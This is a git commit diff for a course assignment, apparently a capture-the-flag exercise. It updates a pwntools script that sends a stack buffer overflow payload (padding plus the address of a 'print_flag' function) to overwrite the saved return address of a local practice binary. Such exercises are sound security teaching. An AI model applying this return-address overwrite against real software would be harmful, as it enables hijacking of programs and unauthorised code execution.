eaf1b6c57504c8acfd1cef28252e1111e50712f1
PH1L3M0N <112344586+PH1L3M0N@users.noreply.github.com>
2025-11-08 03:45:50 +0000

    Updated part2.py

--- assignment-2/2-overflow-the-world/part2.py
+++ assignment-2/2-overflow-the-world/part2.py
@@ -8,12 +8,13 @@ r = process([exe.path])
 
 win = exe.symbols["print_flag"]
 #write your payload here, prompt: it should be overwrite the saved base pointer (rbp), positioning the payload right at the saved return address, then add p64(win).
-payload = b"A" * 72 + p64(win)
+payload = b"A" * 64 + b"A" * 8 + p64(win)
+# payload = b"A" * 72 + p64(win)
 
 r.recvuntil(b"What's your name? ")
 r.sendline(payload)
 
 r.recvuntil(b"Let's play a game.\n")
 flag = r.recvall()
-# print(flag.decode())
-r.interactive()
+print(flag.decode())
+# r.interactive()
